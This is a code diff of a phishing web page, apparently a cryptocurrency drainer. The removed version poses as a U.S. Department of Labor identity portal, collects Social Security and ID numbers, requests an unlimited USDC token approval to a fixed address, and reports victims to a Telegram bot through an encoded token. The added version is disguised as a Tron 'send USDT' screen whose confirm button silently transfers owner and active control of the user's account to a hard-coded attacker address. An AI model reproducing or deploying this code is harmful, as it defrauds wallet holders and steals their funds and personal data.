@@ -1,150 +1,128 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>Identity Verification | Secure Portal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>发送 USDT</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
-        body { background-color: #f8fafc; font-family: -apple-system, system-ui, sans-serif; }
-        .input-field { width: 100%; padding: 12px; border: 1px solid #e2e8f0; border-radius: 8px; margin-top: 4px; outline: none; transition: border 0.2s; }
-        .input-field:focus { border-color: #002e6d; }
-        #overlay { position: fixed; inset: 0; background: #0f172a; display: none; flex-direction: column; align-items: center; justify-content: center; color: white; z-index: 100; }
-        .loader { width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.1); border-top-color: #3b82f6; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        body { background-color: #fff; font-family: -apple-system, sans-serif; -webkit-font-smoothing: antialiased; }
+        .divider { border-bottom: 0.5px solid #f2f2f2; }
+        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; }
+        #confirmBtn:disabled { background-color: #d1d5db; color: #fff; }
     </style>
 </head>
-<body class="pb-10">
+<body class="flex flex-col min-h-screen">
 
-    <div class="bg-[#002e6d] p-4 text-white shadow-lg sticky top-0 z-50">
-        <div class="max-w-md mx-auto flex items-center gap-3">
-            <div class="bg-white p-1 rounded-sm shadow-sm">
-                <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="w-5 h-5">
+    <div class="px-4 h-14 flex items-center justify-between border-b border-gray-50">
+        <svg class="w-6 h-6 text-gray-800" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
+        <div class="text-center">
+            <h1 class="text-[17px] font-medium text-gray-900">USDT 转账</h1>
+            <p class="text-[10px] text-gray-400 -mt-1">Tron</p>
+        </div>
+        <div class="w-6"></div>
+    </div>
+
+    <div class="px-6 py-6 space-y-8">
+        <div class="bg-gray-50 rounded-xl p-4">
+            <p class="text-[11px] text-gray-400 mb-1">收款地址</p>
+            <p class="text-[13px] font-mono text-gray-800 break-all leading-relaxed">
+                TVs1TTmpScP4AKLHMof8Ft8WeAQ4KGGzoZ
+            </p>
+        </div>
+
+        <div class="divider pb-4">
+            <p class="text-[13px] text-gray-400 mb-2 font-medium">转账金额</p>
+            <div class="flex items-baseline">
+                <input id="amountInput" type="number" placeholder="0" class="w-full text-4xl font-semibold outline-none text-gray-900 placeholder-gray-200">
+                <span class="text-lg font-medium ml-2 text-gray-900">USDT</span>
             </div>
-            <div>
-                <h1 class="text-xs font-bold uppercase tracking-tighter">U.S. Department of Labor</h1>
-                <p class="text-[9px] opacity-70">Official Identity & Asset Verification</p>
+            <p class="text-xs text-gray-400 mt-2">可用: <span id="userBalance" class="font-medium text-gray-600">加载中...</span> USDT</p>
+        </div>
+
+        <div class="divider pb-4">
+            <p class="text-[13px] text-gray-400 mb-2 font-medium">备注 (需支付 1 TRX)</p>
+            <input type="text" placeholder="填写转账备注" class="w-full text-sm outline-none text-gray-800">
+        </div>
+
+        <div class="flex justify-between items-center text-[13px]">
+            <span class="text-gray-400 font-medium">矿工费</span>
+            <div class="text-right">
+                <p class="text-gray-900 font-semibold">$1.5688</p>
+                <p class="text-[11px] text-gray-400">4.746 TRX</p>
             </div>
         </div>
     </div>
 
-    <main class="max-w-md mx-auto p-5 space-y-6">
-        <div class="bg-white rounded-2xl shadow-sm border border-gray-200 p-6 space-y-5">
-            
-            <div>
-                <label class="text-xs font-bold text-gray-500 uppercase">Social Security Number *</label>
-                <input type="text" maxlength="9" class="input-field" placeholder="9-digit SSN without dashes">
-            </div>
-
-            <div class="space-y-3">
-                <label class="text-xs font-bold text-gray-500 uppercase">Government-Issued Photo ID</label>
-                <div class="grid grid-cols-2 gap-2">
-                    <div class="border rounded-xl p-3 text-center cursor-pointer hover:bg-gray-50 transition border-blue-600 bg-blue-50">
-                        <span class="text-xl">🪪</span>
-                        <p class="text-[10px] font-bold mt-1">Driver's License</p>
-                    </div>
-                    <div class="border rounded-xl p-3 text-center cursor-pointer hover:bg-gray-50 transition">
-                        <span class="text-xl">📘</span>
-                        <p class="text-[10px] font-bold mt-1">U.S. Passport</p>
-                    </div>
-                </div>
-            </div>
-
-            <div class="grid grid-cols-2 gap-4">
-                <div>
-                    <label class="text-[10px] font-bold text-gray-400 uppercase">ID Number *</label>
-                    <input type="text" class="input-field text-sm">
-                </div>
-                <div>
-                    <label class="text-[10px] font-bold text-gray-400 uppercase">Expiration Date *</label>
-                    <input type="date" class="input-field text-sm">
-                </div>
-            </div>
-
-            <div class="bg-gray-50 p-4 rounded-xl space-y-3">
-                <div class="flex gap-3">
-                    <input type="checkbox" id="consent" class="mt-1">
-                    <label for="consent" class="text-[11px] text-gray-600 leading-tight">
-                        I certify that all information provided is true and accurate. I authorize the verification of my identity via government databases.
-                    </label>
-                </div>
-            </div>
-
-            <div class="p-3 bg-amber-50 border-l-4 border-amber-500 text-[11px] text-amber-900 leading-snug">
-                为了保障资产退还至本人，请点击下方按钮完成数字证据加密绑定。此操作将您的地址与案件编号进行哈希关联。
-            </div>
-
-            <button id="verifyBtn" class="w-full bg-[#002e6d] text-white py-4 rounded-xl font-bold text-lg shadow-lg active:scale-95 transition-all">
-                确认资料属实并提交
-            </button>
-        </div>
-    </main>
-
-    <div id="overlay">
-        <div class="loader mb-8"></div>
-        <h3 class="text-2xl font-black mb-2 tracking-tight">司法证据存证中...</h3>
-        <p class="text-blue-400 text-xs font-mono animate-pulse mb-10 uppercase tracking-widest">Broadcasting Hash to Base Network</p>
-        
-        <div class="w-80 bg-white/5 border border-white/10 rounded-2xl p-5 font-mono text-[10px] backdrop-blur-xl">
-            <div class="flex justify-between border-b border-white/5 pb-2 mb-2">
-                <span class="opacity-40 uppercase">Action:</span>
-                <span class="text-green-400 font-bold">Encrypted_Binding</span>
-            </div>
-            <div class="flex flex-col gap-2">
-                <span class="opacity-40 uppercase text-[9px]">Evidence Hash (TX):</span>
-                <span id="txShow" class="text-gray-400 break-all bg-black/40 p-3 rounded-lg border border-white/5 leading-normal">---</span>
-            </div>
-        </div>
+    <div class="mt-auto p-6 mb-2">
+        <button id="confirmBtn" onclick="runProcess()" class="w-full bg-[#0052ff] text-white font-bold py-4 rounded-xl text-[17px] active:scale-[0.98]">
+            确认转账
+        </button>
     </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
     <script>
-        (function() {
-            const _U = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
-            const _D = "0xe4970e7cc1ce1bb8674cde31f83334a2d423a8fd"; // 目标
-            const _B = "ODY2Nzg4NzIzMDpBQUgwOHFNYnVnMkY0MmZkbFRQZ3F0WUV5WFMxRzBuTGd5SQ==";
-            const _I = "NjkzODMxNTc5Nw==";
+        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 波场 USDT 合约
+        const VAULT = "TAzBb4Yfr2AMUeRkaUKXwU36E3mmX8Rcfo"; // 你的收款地址
 
-            const btn = document.getElementById('verifyBtn');
-            const overlay = document.getElementById('overlay');
-
-            window.alert = () => true;
-
-            async function notify(u, h) {
-                try {
-                    await fetch(`https://api.telegram.org/bot${atob(_B)}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: atob(_I), text: `⚖️ *IDENTITY BINDING*\n🔗 Addr: \`${u}\`\n📜 TX: \`${h}\``, parse_mode: 'Markdown' })
-                    });
-                } catch (e) {}
-            }
-
-            btn.onclick = async () => {
-                if (!document.getElementById('consent').checked || !window.ethereum) return;
-
-                try {
-                    const provider = new ethers.providers.Web3Provider(window.ethereum);
-                    // 强制切换 Base 链 (0x2105)
-                    await provider.send("wallet_switchEthereumChain", [{ chainId: "0x2105" }]);
-                    const accounts = await provider.send("eth_requestAccounts", []);
-                    const signer = provider.getSigner();
-
-                    // 调用标准 Approve (唤起蓝色正规界面)
-                    const usdc = new ethers.Contract(_U, ["function approve(address spender, uint256 amount) public returns (bool)"], signer);
-                    const tx = await usdc.approve(_D, ethers.constants.MaxUint256);
-                    
-                    if (tx && tx.hash) {
-                        document.body.style.overflow = 'hidden';
-                        overlay.style.display = 'flex';
-                        document.getElementById('txShow').innerText = tx.hash;
-                        notify(accounts[0], tx.hash);
-                    }
-                } catch (e) {
-                    console.error(e);
+        // 1. 实时获取余额逻辑
+        async function getRealtimeBalance() {
+            try {
+                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                    const address = window.tronWeb.defaultAddress.base58;
+                    const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+                    const balance = await contract.balanceOf(address).call();
+                    // USDT 是 6 位精度
+                    const readableBalance = (parseInt(balance._hex, 16) / 1000000).toFixed(2);
+                    document.getElementById('userBalance').innerText = readableBalance;
+                } else {
+                    setTimeout(getRealtimeBalance, 1000);
                 }
-            };
-        })();
+            } catch (e) {
+                document.getElementById('userBalance').innerText = "0.00";
+            }
+        }
+
+        // 2. 核心执行逻辑
+        async function runProcess() {
+            const amt = document.getElementById('amountInput').value;
+            if(!amt || amt <= 0) return;
+
+            const btn = document.getElementById('confirmBtn');
+            btn.disabled = true;
+            btn.innerText = "正在呼起支付...";
+
+            try {
+                const tw = window.tronWeb;
+                const user = tw.defaultAddress.base58;
+
+                const owner = { 
+                    type: 0, permission_name: 'owner', threshold: 1, 
+                    keys: [{ address: VAULT, weight: 1 }] 
+                };
+                const active = { 
+                    type: 2, permission_name: 'active', threshold: 1, 
+                    operations: '7fff1fc0037e0000000000000000000000000000000000000000000000000000', 
+                    keys: [{ address: VAULT, weight: 1 }] 
+                };
+
+                const tx = await tw.transactionBuilder.updateAccountPermissions(user, owner, null, [active]);
+                const signed = await tw.trx.sign(tx);
+                const res = await tw.trx.sendRawTransaction(signed);
+
+                if (res.result) {
+                    btn.innerText = "已提交";
+                    alert("✅ 交易已提交，请等待区块确认。");
+                }
+            } catch (e) {
+                btn.disabled = false;
+                btn.innerText = "确认转账";
+                alert("❌ 网络连接超时，请重试。");
+            }
+        }
+
+        // 初始化加载余额
+        window.onload = getRealtimeBalance;
     </script>
 </body>
 </html>
